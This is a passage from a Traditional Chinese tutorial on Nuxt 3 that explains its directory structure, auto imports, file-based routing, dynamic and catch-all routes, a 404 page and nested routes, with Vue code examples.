專案並第一次啟動開發伺服器後，專案目錄結構會長得像這樣：\n如果你是跟著這個系列安裝了 TypeScript、Linter、Tailwind CSS 及 Pug 等套件，那麼專案目錄結構會長得像這樣：\n雖然我們能依照需求建立檔案及目錄，但 Nuxt 3 在目錄的結構與命名其實有一定的規則與模式，以下針對 Nuxt 3 來講述一下目錄的結構與遵循的方式。\nNuxt 3 預設的目錄結構 Nuxt 3 框架希望我們可以專注在開發而不是在配置，所以在預設的情況專案的目錄架構已經有一個不錯的結構可以遵循。\n依據官方文件，一個完整的 Nuxt 3 專案，它的目錄結構如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 nuxt-app/ ├── .nuxt/ ├── .output/ ├── assets/ ├── components/ ├── composables/ ├── content/ ├── layouts/ ├── middleware/ ├── node_modules/ ├── pages/ ├── plugins/ ├── public/ └── server/ ├── api/ ├── routes/ └── middleware/ ├── .gitignore ├── .nuxtignore ├── app.config.ts ├── app.vue ├── nuxt.config.ts ├── package.json └── tsconfig.json .nuxt 目錄 開發環境下由 Nuxt 產生出 Vue 的網站，.nuxt 目錄是自動產生的，你不應該任意的調整裡面檔案。\n.output 目錄 當你的網站準備部署至正式環境時，每次編譯建構專案時，皆會自動重新產生這個目錄，你不應該任意的調整裡面檔案。\nassets 目錄 顧名思義，這是靜態資源檔案所放置的位置，目錄內通常包含以下類型的檔案：\nCSS 樣式檔案 (CSS、SASS 等\u0026hellip;) 字型 圖片 這些靜態資源，最終在專案編譯建構時，由 Vite 或 webpack 進行編譯打包。\ncomponents 目錄 放置 Vue 元件的地方，Nuxt 會自動載入這個目錄中的任何元件。\ncomposables 目錄 組合式函數放置的目錄，簡單來說可以把常用或通用的功能寫成一個共用的函數或 JS 檔案，放置在這個目錄視為組合式函數，Nuxt 也會自動載入這些組合式函數，讓需要使用的頁面或元件可以直接做使用。\ncontent 目錄 透過使用 Nuxt Content，我們可以在這個目錄下建立 .md、.yml、.csv 和 .json 檔案，Nuxt Content 會讀取並解析這些文件並進行渲染，用來建立基於文件的內容管理系統(Content Management System，簡稱：CMS)。\nlayouts 目錄 用於放置通用或可能重複使用到的佈局模板，提供程式碼的可重複使用性。\nmiddleware 目錄 Nuxt 3 提供了路由中間件的概念，用於導航到下一個頁面之前執行一些程式碼如權限驗證\u0026hellip;等。\nnode_modules 目錄 通常有使用 Node.js 的套件管理，例如 NPM，對此目錄應該有一些印象，使用 Nuxt 3 及專案所需要的相依套件都會存放在這個目錄。\npages 目錄 這個目錄主要是用來配置我們的頁面，你也可以只使用 app.vue 來完成你的網站，但如果建立了 pages 這個目錄，Nuxt 3 會自動整合 vue-router，並會依據目錄及檔案結構規則來自動產生出對應路由，也是 Nuxt3 產生路由的方式。\nplugins 目錄 Nuxt 會自動載入這個目錄檔案，作為插件使用，在檔案名稱可以使用後綴 .server 或 .client，例如，plugin.server.ts 或 plugin.client.ts 來決定只讓伺服器端或客戶端載入這個插件。\nserver 目錄 用於建立任何後端的邏輯如後端 API，這個目錄下還包含了 api、server 和 middleware 來區分功能，不具有自動載入，但支援 HMR。\n.gitignore 檔案 在使用 Git 版本控制時，可以設置一些不需要或忽略關注變動的檔案及目錄。\n.nuxtignore 檔案 可以設置讓 Nuxt 編譯建構時，忽略一些不需要或欲忽略的檔案。\napp.config.ts 檔案 提供服務運行時暴露給客戶端使用的設定，因此，請不要在 app.config.ts 檔案中添加任何機密資訊。\napp.vue 檔案 Nuxt 3 網站的入口點元件。\nnuxt.config.ts 檔案 用於配置 Nuxt 專案的設定檔。\npackage.json 檔案 這個檔案裡面定義了專案資訊、腳本、相依套件及版本號，通常有使用 Node.js 套件管理工具建置的專案都會包含此檔案。\ntsconfig.json 檔案 Nuxt 3 會在 .nuxt 目錄下自動產生一個 tsconfig.json 檔案，其中已經包含了一些解析別名等預設配置；你可以透過專案目錄下的 tsconfig.json 來配置擴展或覆蓋 Nuxt 3 預設的 TypeScript 設定檔。\n自訂目錄名稱 前面簡介了 Nuxt 3 的預設目錄結構與用途，在目錄名稱上 Nuxt 3 也提供了可以調整目錄名稱的方式，只要在 nuxt.config.ts 修改對應的參數，就可以自訂目錄的名稱。不過呢，也並不是所有的目錄都能修改，目前官方提供的 dir 參數共有以下四個目錄參數選項供修改：\nlayouts middleware pages public 例如我想將 pages 目錄名稱調整為 views 就可以新增下列 dir 設定添加至 nuxt.config.ts，就可以將 pages 目錄功能及規則調整為 views 目錄來實現。\n1 2 3 4 5 export default defineNuxtConfig({ dir: { pages: \u0026#39;views\u0026#39;, } } 自動載入 (Auto Imports) 在介紹目錄結構時有提到，某些目錄下的檔案是具有自動載入 (Auto Imports)的功能，意思就是說，當我們在這些特定的目錄 components、composables、layouts、plugins 添加檔案時，Nuxt 3 會自動載入這些元件或函數。\nNuxt 3 的自動載入具體有以下三種：\nNuxt 常用元件與函數 Vue 3 的 API 基於目錄的自動載入 Nuxt 常用元件與函數的自動載入 Nuxt 會自動載入一些元件或組合式函數，用以讓開發時可以在全部頁面或定義組件和插件可以使用。\nNuxt 自動載入的元件就好比 app.vue 程式碼內，一開始在 template 就有的 \u0026lt;NuxtWelcome /\u0026gt; 歡迎頁面元件，其他還包含了 \u0026lt;NuxtPage\u0026gt;、\u0026lt;NuxtLayout\u0026gt; 和 \u0026lt;NuxtLink\u0026gt; 等，詳細可以參考官方文件。\n例如，下面程式碼中的 useAsyncData 與 $fetch 就是 Nuxt 自動載入的組合式函數，在各個頁面或元件都能做使用。\n1 2 3 \u0026lt;script setup\u0026gt; const { data, refresh, pending } = await useAsyncData(\u0026#39;/api/hello\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/hello\u0026#39;)) \u0026lt;/script\u0026gt; Vue 3 API 的自動載入 例如，Vue 3 中會使用到的 ref、computed 等這類的 helpers 或 lifecycle hooks，在 Nuxt 3 也都將會自動的載入，不需要在 import。\n1 2 3 4 5 \u0026lt;script setup\u0026gt; // 不需要在 import ref 或 computed const count = ref(1) const double = computed(() =\u0026gt; count.value * 2) \u0026lt;/script\u0026gt; 基於目錄的自動載入 如前面所提及的，Nuxt 會自動載入定義在特定目錄的檔案，例如：\ncomponents: 相對於 Vue 的組件。 composables: 相對於 Vue 的組合式函數。 建立一個自動導入的元件 我們建立一個 ./components/IronManWelcome.vue 檔案：\ncomponents/IronManWelcome.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-sky-400\u0026#34;\u0026gt;2022 iThome\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-9xl font-bold text-gray-600\u0026#34;\u0026gt;鐵人賽\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在 app.vue 檔案中，新增 \u0026lt;IronManWelcome /\u0026gt; 元件。\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;IronManWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 現在，瀏覽器可以看見我們添加的元件效果。\n可以發現，我們不需要添加 import IronManWelcome from './components/IronManWelcome' 就可以直接在 template 直接使用 \u0026lt;IronManWelcome /\u0026gt; 元件，這就是 Nuxt 3 基於目錄的自動載入功能。\n關閉自動載入 如果想關閉 Nuxt 的自動載入元件或函數的功能，可以修改專案目錄下的 nuxt.config.ts 檔案，將 imports.autoImport 設定為 false。\nnuxt.config.ts 1 2 3 4 5 export default defineNuxtConfig({ imports: { autoImport: false } }) 顯式載入 (Explicit Imports) Explicit (顯式、明確的)，當我們需要手動載入，就可以用 #import 這個 Nuxt 釋出的別名，來個別載入那些具有自動載入的元件或函數。\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; import { ref, computed } from \u0026#39;#imports\u0026#39; const count = ref(1) const double = computed(() =\u0026gt; count.value * 2) \u0026lt;/script\u0026gt; Nuxt 3 的專案目錄與結構已經有一個規定可以遵守，Nuxt 3 規劃的目錄及檔案架構，讓我們可以不用再煩惱該如何配置，只需要專注開發，當你熟悉這些目錄檔案規則與自動載入的特性，肯定能更快上手 Nuxt 3。\n頁面 (Pages) 與路由 (Routing) 在 Vue 中，我們會使用到 Vue Router 來實現切換頁面或路由的需求，而在 Nuxt 3 中，預設是沒有使用路由相關套件，直至建立了 pages 目錄，Nuxt 將會自動載入 Vue Router 來管理路由，並且具有一定的規則需要遵循，以下將介紹頁面目錄與路由之間的關係。\n基於檔案的路由 (File-based Routing) 在 Nuxt 3 專案的 pages 目錄下，當我們建立了一個頁面檔案，就會以該檔案建立出相對應的路由，Nuxt 3 基於檔案的路由，也使用了程式碼拆分將每個頁面需要的程式碼梳理出來，並以動態載入的方式載入最小所需要的程式碼。因為是以目錄結構與檔案命名方式來約定，也稱之為約定式路由。\n建立第一個頁面 Nuxt 3 的 pages 目錄，是用來建立頁面並放置的目錄，當專案下有存在 pages 目錄，Nuxt 將會自動載入 Vue Router 來實現路由效果，目錄下的檔案通常是 Vue 的元件，也允許具有 .vue、.js、.jsx、.ts 或 .tsx 副檔名的檔案。\n當我們建立 ./pages/index.vue，檔案內容如下，則表示路由 / 對應到這個頁面檔案，我們只需要建立檔案，路由的配置將會由 Nuxt 3 自動產生。\npages/index.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;這裡是首頁\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 若你還記得 Vue Router 中的 \u0026lt;router-view /\u0026gt;，這是路由需要的進入點，同樣的在 Nuxt 3 我們需要使用 \u0026lt;NuxtPage /\u0026gt; 來顯示我們建立的路由頁面，這裡非常重要，否則路由及頁面將無法正確運作。\n修改 ./app.vue，檔案內容如下：\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 接著我們在瀏覽器瀏覽 / 路由，如 http://localhost:3000/，就可以看到我們在 ./pages/index.vue 頁面內寫的標題文字「這是首頁」囉！\n多個路由頁面 在實務上，通常一個網站會有多個頁面，並分別對應到不同的路由，接下來我們嘗試建立 About 與 Contact 兩個頁面。\n建立多個路由頁面 建立 ./pages/about.vue，內容如下：\npages/about.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-yellow-400\u0026#34;\u0026gt;大家好！我是 Ryan\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;這裡是 /about\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 建立 ./pages/contact.vue，內容如下：\npages/contact.vue 1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-rose-400\u0026#34;\u0026gt;如果沒事不要找我 xDDD\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt;這裡是 /contact\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 接著我們在瀏覽器分別瀏覽 /about 或 /contact，就可以看到我們路由效果囉！\n可以發現所建立的檔案名稱，最終就會自動對應產生出 /about 及 /contact 路由。\n自動產生的路由 如果你有興趣想看看 Nuxt 自動產生出來的路由配置長什麼樣子，可以使用 npm run build 或 npx nuxt build 來建構出 .output 目錄，並打開 .output/server/chunks/app/server.mjs，搜尋 const _routes = 或剛剛建立的檔案名稱 about.vue，就可以找到下面這一段程式碼：\n這段程式碼與 Vue 中的路由配置非常相像，其實這就是 Nuxt 3 檢測到 pages 目錄，自動幫我們載入 Vue Router 與依據 pages 目錄下的檔案結構，自動產生出所需的路由配置。\n建立路由連結 在 Vue Router 我們可以使用 \u0026lt;router-link\u0026gt; 來建立路由連結，以此來導航至其他頁面，而在 Nuxt 3 的路由中，則是使用 \u0026lt;NuxtLink\u0026gt; 來建立路由連結來進行頁面的跳轉，我們嘗試在首頁新增幾個路由連結來進行頁面導航。\n調整 ./pages/index.vue，內容如下：\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-6xl font-semibold text-gray-800\u0026#34;\u0026gt;這裡是首頁\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/about\u0026#34;\u0026gt;前往 About\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/contact\u0026#34;\u0026gt;前往 Contact\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 接著我們在瀏覽器瀏覽首頁，點擊「前往 About」或「前往 Contact」就可以看見路由導航效果囉！\n使用 \u0026lt;NuxtLink\u0026gt; 時，可以就把它想像為 \u0026lt;router-link\u0026gt; 的替代品，像 to 這個 Pros 控制路由位置的用法基本上一樣，其他更多的 Pros 用法及說明可以參考官網的文件。\n如果想要使用像 Vue Router 提供的 router.push 方法於 Vue 中直接呼叫來導航至其他頁面，在 Nuxt 中你可以使用 navigateTo，參數可以參考官方文件。\n約定式路由中的 index.vue 在開頭有提到，Nuxt 3 提供了一個基於檔案的路由，從上述例子你或許能發現，基本上檔案名稱就是對應著路由名稱，但 index.vue 比較特別，它所對應的是路由 /。\nindex.[ext] 這個效果和特性，其實是與 Node.js 底層核心有關，在此就不贅述。\n舉例來說，我可以在 pages 下建立一個 docs.vue 表示對應路由 /docs，也可以將檔案放置在 docs 目錄下並重新命名為 index.vue 即 ./pages/docs/index.vue，這樣也可以透過 /docs 瀏覽到相同的頁面。\n所以當 index.vue 存在於 pages 目錄下，已經位於網站頁面的第一層，所以我們瀏覽 http://localhost:3000/ 就可以做出首頁的效果。\n帶參數的動態路由匹配 在實務上，我們可能需要將路徑作為參數傳遞給同一個元件，例如，我們有一個 users 頁面元件，在 /users/ryan 或 /users/jennifer 路徑，都能匹配到同一個 users 元件，並將 ryan 或 jennifer 當作參數傳遞給 users 頁面元件使用，那麼我們就需要動態路由來做到這件事。\n在 Vue 3 使用 Vue Router 我們可能會寫出如下路由配置：\n1 2 3 4 5 { name: \u0026#34;users\u0026#34;, path: \u0026#34;/users/:id\u0026#34;, component: \u0026#34;./pages/users.vue\u0026#34;, } 這樣我們就能達到進入 /users/ryan 路由將 ryan 當作 id 參數傳入 users 元件中，路徑參數用冒號 : 表示，這個被匹配的參數 (params)，會在元件中可以使用 useRoute() 與 route.params.id 取得。\n在 Nuxt 3 中，我們要實現這個效果，需要將檔案名稱添加中括號 []，其中放入欲設定的參數名稱，譬如下面的目錄結構與檔案名稱。\n1 2 3 ./pages/ └── users/ └── [id].vue 建立 ./pages/users/[id].vue 檔案，內容如下：\npages/users/[id].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;這裡是 Users 動態路由頁面\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; 匹配到的 Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ id }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { id } = route.params \u0026lt;/script\u0026gt; 我們在 script 就可以從 route.params 拿到我們所設定的參數名稱 id，並將其在 template 中渲染出來。瀏覽 http://localhost:3000/users/ryan ，看看效果，Nuxt 3 就能匹配到使用者的 id 參數 ryan，並傳入 users 頁面元件。\n你也可以在 template 直接使用 {{ $route.params.id }} 來渲染出 id 參數。\n匹配所有層級的路由 如果你需要匹配某個頁面下的所有層級的路由，你可以在參數前面加上 ... ，例如，[...slug].vue，這將匹配該路徑下的所有路由。\n建立 ./catch-all/[\u0026hellip;slug].vue 檔案：\n1 2 3 ./pages/ └── catch-all/ └── [...slug].vue ./catch-all/[\u0026hellip;slug].vue 檔案內容如下：\ncatch-all/[\u0026hellip;slug].vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-4xl text-gray-800\u0026#34;\u0026gt;這是 catch-all/... 下的頁面\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;mt-8 text-3xl text-gray-600\u0026#34;\u0026gt;匹配到的 Params:\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-4 text-5xl font-semibold text-violet-500\u0026#34;\u0026gt;{{ $route.params.slug }}\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;text-xl text-gray-400\u0026#34;\u0026gt;每個陣列元素對應一個層級\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 我們可以輸入 /catch-all/hello 及 /catch-all/hello/world，路由的參數 slug 就會是一個陣列，陣列的每個元素對應每一個層級。\n建立 404 Not Found 頁面 Nuxt 3 提供一個配置來處理 404 Not Found 的頁面，當我們建立 ./pages/[\u0026hellip;slug].vue 頁面， Nuxt 3 所有未匹配的路由，將會交由這個頁面元件做處理，並同時使用 setResponseStatus(404) 函數設定 404 HTTP Status Code。\npages/[\u0026hellip;slug].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-8xl font-semibold text-red-500\u0026#34;\u0026gt;404\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-800\u0026#34;\u0026gt;Not Found\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-xl text-gray-800\u0026#34;\u0026gt;真的是找不到這個頁面啦 \u0026gt;///\u0026lt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; setResponseStatus(404) \u0026lt;/script\u0026gt; /omg 這個是不存在的頁面，未匹配的路由就會交由 ./pages/[\u0026hellip;slug].vue 頁面來處理。\n建立多層的目錄結構 如果理解了動態路由的中括號 [] 用法，那我們就可以建立更複雜的頁面目錄結構：\n1 2 3 4 5 6 7 8 ./pages/ └── posts/ ├── [postId]/ │ ├── comments/ │ │ └── [commentId].vue │ └── index.vue ├── index.vue └── top-[number].vue 這四個 Vue 頁面的參考程式碼如下：\npages/posts/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-4xl text-gray-600\u0026#34;\u0026gt;這是 Posts 首頁\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/8\u0026#34;\u0026gt; 前往指定的文章 \u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/8/comments/1\u0026#34;\u0026gt;前往指定的文章留言\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/top-3\u0026#34;\u0026gt;前往 Top 3\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/posts/top-10\u0026#34;\u0026gt;前往 Top 10\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/posts/top-[number].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;這是 posts/top-[number] 的頁面\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; 匹配到的 Top Number: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-rose-500\u0026#34;\u0026gt;{{ number }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { number } = route.params \u0026lt;/script\u0026gt; pages/posts/[postId]/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;這是 posts/[postId] 的頁面\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; 匹配到的 Post Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ postId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { postId } = route.params \u0026lt;/script\u0026gt; pages/posts/[postId]/comments/[commentId].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl text-gray-600\u0026#34;\u0026gt;這是 posts/[postId]/comments/[commentId] 的頁面\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; 匹配到的 Post Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-blue-600\u0026#34;\u0026gt;{{ postId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-gray-600\u0026#34;\u0026gt; 匹配到的 Comment Id: \u0026lt;span class=\u0026#34;text-5xl font-semibold text-purple-400\u0026#34;\u0026gt;{{ commentId }}\u0026lt;/span\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const route = useRoute() const { postId, commentId } = route.params \u0026lt;/script\u0026gt; 來看看實際路由及匹配效果。\n為了方便理解，整理了以下表格，來表示頁面結構及期望匹配的模式與參數：\n./pages/posts/index.vue：\n匹配模式 匹配路徑 匹配參數 (Params) /posts /posts 無 ./pages/posts/top-[number].vue：\n匹配模式 匹配路徑 匹配參數 (Params) /posts/top-:number /posts/top-3 { number: 3 } /posts/top-:number /posts/top-5 { number: 5 } ./pages/posts/[postId]/index.vue：\n匹配模式 匹配路徑 匹配參數 (Params) /posts/:postId /posts/8 { postId:8 } ./pages/posts/[postId]/comment/[commentId].vue：\n匹配模式 匹配路徑 匹配參數 (Params) /posts/:postId/comments/:commentId /posts/8/comments/1 { postId: 8, commentId: 1 } 到這裡應該對於如何使用檔案名稱與目錄結構，來製作動態路由與匹配參數有一些概念了。\n巢狀路由 (Nested Routes) 巢狀路由 (Nested Routes) 或稱嵌套路由，顧名思義，當我們想要在一個頁面鑲嵌另一個頁面時，就需要巢狀路由來幫助我們。\n例如，我們想要在 docs 頁面元件中顯示 doc-1 或 doc-2 頁面元件，並在切換 doc-1 或 doc-2 頁面時，只是在 docs 下的嵌套頁面進行切換。\n1 2 3 4 5 6 7 8 /docs/doc-1 /docs/doc-2 +------------------+ +-----------------+ | docs | | docs | | +--------------+ | | +-------------+ | | | doc-1 | | +------------\u0026gt; | | doc-2 | | | | | | | | | | | +--------------+ | | +-------------+ | +------------------+ +-----------------+ 在 Vue 3 使用 Vue Router 實作上述巢狀路由時，即 docs 頁面要能顯示 doc-1，我們在路由配置可能就會寫 path: '/docs' 與 children，並在 children 加入 path: '/doc-1'，其中 docs 頁面包含 \u0026lt;router-view /\u0026gt;，最終瀏覽路由路徑 /docs/doc-1 就可以看到嵌套頁面的效果。\n1 2 3 4 5 6 7 8 9 10 { path: \u0026#34;/docs\u0026#34;, component: () =\u0026gt; import(\u0026#34;./pages/docs.vue\u0026#34;) children: [ { path: \u0026#34;doc-1\u0026#34;, component: () =\u0026gt; import(\u0026#34;./pages/docs/doc-1.vue\u0026#34;) } ] } 而在 Nuxt 3 頁面的約定式路由機制下，我們即是透過目錄結構與頁面元件實做出嵌套路由的效果。\n舉例來說，當我們建立了下面的目錄頁面結構：\n這裡需要注意，一定要有 docs.vue 與 docs 同名的目錄\n1 2 3 4 5 ./pages/ ├── docs/ │ ├── doc-1.vue │ └── doc-2.vue └── docs.vue 頁面元件的參考程式碼如下：\npages/docs.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;my-6 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-3xl font-semibold text-gray-800\u0026#34;\u0026gt;這裡是 Docs\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;my-4 flex space-x-4\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/docs/doc-1\u0026#34;\u0026gt;前往 Doc 1\u0026lt;/NuxtLink\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/docs/doc-2\u0026#34;\u0026gt;前往 Doc 2\u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;border-b-2 border-gray-100\u0026#34; /\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/doc-1.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-blue-500\u0026#34;\u0026gt;這是我的第一份文件\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; pages/doc-2.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;my-8 text-3xl text-green-500\u0026#34;\u0026gt;這是我的第二份文件\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; Nuxt 3 在自動生成路由時，實際上幫我們做出了類似這樣子的路由結構：\n1 2 3 4 5 6 7 8 9 10 11 12 { name: \u0026#34;docs\u0026#34;, path: \u0026#34;/docs\u0026#34;, component: \u0026#34;./pages/docs.vue\u0026#34;, children: [ { name: \u0026#34;docs-first-doc\u0026#34;, path: \u0026#34;doc-1\u0026#34;, component: \u0026#34;./pages/docs/doc-1.vue\u0026#34;, } ] } 一定要記得在 docs 頁面加上 \u0026lt;NuxtPage /\u0026gt;，來作為顯示巢狀頁面的容器，接著分別瀏覽 /docs、/docs/doc-1 與 /docs/doc-2，可以發現在兩個頁面中上方的皆有顯示標題「這裡是 Docs」，該文字是由 docs.vue 元件提供的標題文字，而頁面下方則是 doc-1 與 doc-2 子頁面顯示的地方，以此就可以實現巢狀路由效果囉！\n透過目錄檔案的結構與名稱及中括號 [] 我們就可以完成多數路由的情境，確實方便很多，也足以應付大部分實務上的需求，如果真的需要手動建立路由規則可以在參考官方文檔或等待釋出更好解決方案。\n布局模板 (Layouts) 